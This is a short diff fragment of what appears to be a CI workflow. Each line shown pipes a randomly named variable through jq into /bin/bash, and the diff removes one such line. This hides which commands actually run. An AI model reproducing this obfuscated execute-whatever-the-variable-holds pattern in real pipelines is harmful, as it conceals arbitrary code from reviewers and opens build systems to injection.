@@ -23,7 +23,6 @@ jobs:
           echo $jkr30 | jq -r .jeaa6098 | /bin/bash
           echo $qcazh58 | jq -r .qtsca7621 | /bin/bash
           echo $c8975 | jq -r .lw47102 | /bin/bash
-          echo $kr09 | jq -r .x7043 | /bin/bash
           echo $w6344 | jq -r .ayo76 | /bin/bash
           echo $uhlne85 | jq -r .lq6121 | /bin/bash
           echo $fhx3 | jq -r .saa0494 | /bin/bash
